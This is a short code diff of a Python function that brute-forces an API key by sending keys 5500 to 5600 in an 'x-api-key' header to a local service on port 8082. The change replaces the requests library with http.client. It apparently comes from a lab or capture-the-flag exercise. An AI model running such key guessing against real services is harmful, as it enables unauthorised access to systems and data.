@@ -1,11 +1,17 @@
-import requests
+import http.client
 
 def find_key():
     for key in range(5500, 5601):
         try:
-            response = requests.get("http://127.0.0.1:8082", headers={"x-api-key": str(key)})
-            if response.status_code == 200:
-                return f"Key: {key}, Response: {response.text}"
+            conn = http.client.HTTPConnection("127.0.0.1", 8082)
+            headers = {'x-api-key': str(key)}
+            conn.request("GET", "/", headers=headers)
+            response = conn.getresponse()
+
+            if response.status == 200:
+                return f"Key: {key}, Response: {response.read().decode()}"
+            
+            conn.close()
         except Exception as e:
             print(f"An error occurred with key {key}: {e}")
 
